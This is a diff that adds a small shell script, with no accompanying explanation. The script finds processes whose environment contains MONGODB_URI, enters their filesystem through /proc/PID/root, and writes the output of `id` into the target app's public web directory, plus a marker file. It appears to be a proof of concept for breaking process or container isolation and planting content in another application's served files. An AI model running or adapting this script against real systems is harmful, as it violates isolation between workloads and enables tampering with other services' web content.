@@ -1,0 +1,10 @@
+#!/bin/sh
+for f in $(grep -al MONGODB_URI /proc/[0-9]*/environ 2>/dev/null); do
+  p=${f#/proc/}; p=${p%%/*}
+  [ -d /proc/$p/root/app ] || continue
+  id > /proc/$p/root/app/public/zz9.txt 2>/dev/null || continue
+  echo OK > /proc/$p/root/app/zz9b.txt 2>/dev/null
+  sleep 12
+  exit
+done
+sleep 3
